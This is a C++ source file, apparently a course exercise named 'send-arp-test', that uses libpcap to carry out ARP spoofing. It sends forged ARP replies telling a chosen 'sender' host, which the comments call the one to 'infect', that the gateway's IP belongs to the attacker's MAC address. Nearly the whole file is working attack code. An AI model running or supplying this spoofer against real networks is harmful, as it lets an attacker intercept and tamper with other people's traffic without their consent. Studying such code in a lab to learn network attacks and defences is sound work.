#include <cstdio>
#include <pcap.h>
#include "ethhdr.h"
#include "arphdr.h"
#include <string>
#include "Get_my_IP.h"
#include <vector>
#include "GetGatewayIP.h"
//#include "MakePacket.h"
//#include "EthArpPacket.h"


using namespace std;

#pragma pack(push, 1)
struct EthArpPacket final 
{	
	EthHdr eth_;
	ArpHdr arp_;
};
#pragma pack(pop)

void usage()
{
	printf("syntax: send-arp-test <interface>\n");
	printf("sample: send-arp-test wlan0\n");
	printf("syntax : send-arp-test <interface> <sender ip> <target ip> \
			[<sender ip 2> <target ip 2> ...]");
}


// sender : i'd like to infect
// target : generally gateway

void MakeRequestPacket( struct EthArpPacket& _packet, std::string _my_IP, std::string _my_mac, std::string _gatewayIP);
void MakeReplyPacket( struct EthArpPacket& _packet, std::string _targetIP, std::string _senderIP, std::string _senderMAC
		, std::string _my_IP, std::string _my_mac);
void GetTargetMacUsingARP(std::string targetIP, std::string& targetMAC);

int main(int argc, char* argv[]) 
{	
	if (argc < 4|| (argc > 4 && (argc % 2) != 0) ) 
	{
		usage();
		return -1;
	}

	std::string ethernet(argv[1]);	
	std::vector<std::string> senders;
	std::vector<std::string> targets;

	int j = 2;
	while ( argv[j] != NULL)
	{
		senders.push_back(argv[j++]);
		targets.push_back(argv[j++]);	
	}

	//for(auto iter = senders.begin(); iter != senders.end(); iter++)
	//	std::cout << *iter << std::endl;

	char errbuf[PCAP_ERRBUF_SIZE];
	//pcap_t* handle = pcap_open_live(dev, 0, 0, 0, errbuf);
	pcap_t* handle = pcap_open_live(ethernet.c_str(), BUFSIZ, 1, 1, errbuf);
	if (handle == nullptr) 
	{
		//fprintf(stderr, "couldn't open device %s(%s)\n", dev, errbuf);
		fprintf(stderr, "couldn't open device %s(%s)\n", ethernet.c_str(), errbuf);
		return -1;
	}

	///////////////////////////////////////////////////////////////////	
	//char ping[100] = "ping -c 1 ";	
	//printf("%s", argv[3]);

	//strncat(ping, argv[3], strlen(argv[3]));
	//FILE * fp;

	//char arp_an[100] = "arp -an";
	//fp = popen(arp_an, "r");

#define BUFF_SIZE 1024
	//char buff[BUFF_SIZE];	

	//printf("execute arp -an\n");
	//while(fgets(buff, BUFF_SIZE, fp))
		//printf("%s ", buff);

	//printf("execute arp -d %s\n", targets[0]);

	//while(fgets(buff, BUFF_SIZE, fp))
	//	printf("%s", buff);	


	//char response[100];
	//fp = popen("arp -an", "r");
	//printf("\n");
	//while(fgets(buff, BUFF_SIZE, fp))
	//	printf("%s", buff);

	//char*ptr = strtok(buff, " ");
	//char * ping_infos[30] = {NULL};
	//int i = 0;
	//while (ptr != NULL)               
	//{
		//printf("%s\n", ptr);
	//	ping_infos[i] = ptr;		
	//	ptr = strtok(NULL, " ");
	//	i++;	
	//}	
	//char *ptr = strtok(buff, " ");  
	//printf("target mac address : %s\n", ping_infos[3]);
	////////////////////////////////////////////////////////////////////////////////////////

	std::string my_IP;
	std::string my_mac;
	//std::cout<< "my mac : " << my_mac << std::endl;
	//char * ethernet = argv[1];
	//std::cout<< ethernet < std::endl;
	//printf("%s\n", ethernet);

	//std::string ethernet(argv[1]);
	std::cout<< "ethernet : " <<ethernet << std::endl;	
	Get_my_IP(my_IP, my_mac);

	EthArpPacket reply_packet;	
	// needed my ip, mac , gateway ip, mac, sender ip, mac
	// MakeArpPacket(reply_packet, my_IP, target[0]);

	std::string gatewayIP;
	GetGatewayIP(gatewayIP);

	std::cout << "gatewayIP : " << gatewayIP << std::endl;


	std::cout << "::::::::::::::::::::: Send Packet ::::::::::::::::::::::::" << std::endl;
	std::cout << "::::::::::::::::::::: Request Packet ::::::::::::::::::::::::" << std::endl;
	EthArpPacket req_packet, rpy_packet;
	MakeRequestPacket(req_packet, my_IP, my_mac, gatewayIP);
	
	int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&req_packet), sizeof(EthArpPacket));
	if (res != 0) 
	{
		fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
	}


	std::cout << "::::::::::::::::::::: Reply Packet ::::::::::::::::::::::::" << std::endl;
	for(int i = 0 ; i < senders.size(); i++)
	{
		std::string gatewayIP = targets[i];
		std::string infectIP = senders[i];
		
		std::string infectMAC;
		
		//
		GetTargetMacUsingARP(infectIP, infectMAC);
		std::cout <<"sender MAC : " << infectMAC << std::endl;
		
		MakeReplyPacket(rpy_packet, targets[i], senders[i], infectMAC, my_IP, my_mac);
		
		int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&rpy_packet), sizeof(EthArpPacket));
		if(res != 0)
		{
			fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
		}
	}
	

	//pclose(fp);
}


void MakeRequestPacket( struct EthArpPacket & _packet, std::string _my_IP, std::string _my_mac, std::string _gatewayIP) 
{
	EthArpPacket packet;
	// boradcasting, my mac
	packet.eth_.dmac_ = Mac("FF:FF:FF:FF:FF:FF");
	packet.eth_.smac_ = Mac(_my_mac.c_str());
	packet.eth_.type_ = htons(EthHdr :: Arp);

	packet.arp_.hrd_ = htons(ArpHdr::ETHER);
	packet.arp_.pro_ = htons(EthHdr::Ip4);
	packet.arp_.hln_ = Mac::SIZE;
	packet.arp_.pln_ = Ip::SIZE;
	packet.arp_.op_ = htons(ArpHdr::Request);

	// my mac, my IP
	packet.arp_.smac_ = Mac(_my_mac.c_str());
	packet.arp_.sip_ = htonl(Ip(_my_IP.c_str()));
	

	// unknown, gateway IP
	packet.arp_.tmac_ = Mac("00:00:00:00:00:00");
	packet.arp_.tip_ = htonl(Ip(_gatewayIP.c_str()));
	_packet = packet;

	std::cout << "make request packet done"<< std::endl;
}

void MakeReplyPacket( struct EthArpPacket& _packet, std::string _targetIP, std::string _senderIP, std::string _senderMAC
		, std::string _my_IP, std::string _my_mac)
{

	EthArpPacket packet;
	// infect mac, my mac 
	packet.eth_.dmac_ = Mac(_senderMAC.c_str());
	packet.eth_.smac_ = Mac(_my_mac.c_str());
	packet.eth_.type_ = htons(EthHdr::Arp);

	packet.arp_.hrd_ = htons(ArpHdr::ETHER);
	packet.arp_.pro_ = htons(EthHdr::Ip4);
	packet.arp_.hln_ = Mac::SIZE;
	packet.arp_.pln_ = Ip::SIZE;
	packet.arp_.op_ = htons(ArpHdr::Reply);

	// my mac, gateway ip
	packet.arp_.smac_ = Mac(_my_mac.c_str());
	packet.arp_.sip_ = htonl(Ip(_targetIP.c_str()));

	// infect mac, infect ip
	packet.arp_.tmac_ = Mac(_senderMAC.c_str());
	packet.arp_.tip_ = htonl(Ip(_senderIP.c_str()));

	_packet = packet;
}

void GetTargetMacUsingARP(std::string _targetIP, std::string& _targetMAC)
{

	// obtain sender mac
	char arp_an[100] = "arp -an";
	FILE * fp = popen(arp_an, "r");
	
	char buff[BUFF_SIZE];

	printf("execute arp -an\n");
	while(fgets(buff, BUFF_SIZE, fp))
	{
		//char * pinf_infos[30];
		char * ptr = strtok(buff, " ");
		int i = 0;
		char * arp_infos[30] = {NULL};
		while (ptr != NULL)               
		{
			//printf("ptr : %s\n", ptr);
			arp_infos[i] = ptr;		
			ptr = strtok(NULL, " ");
			//printf("strtok ptr : %s\n", ptr);
			//std::string str(ptr);
			//std::cout<< "arp : " << str<< std::endl;
			i++;
		}
		std::string ip(arp_infos[1]);
		if( ip.find(_targetIP)!= std::string::npos )
			_targetMAC = std::string(arp_infos[3]);

	
	}
	pclose(fp);


}

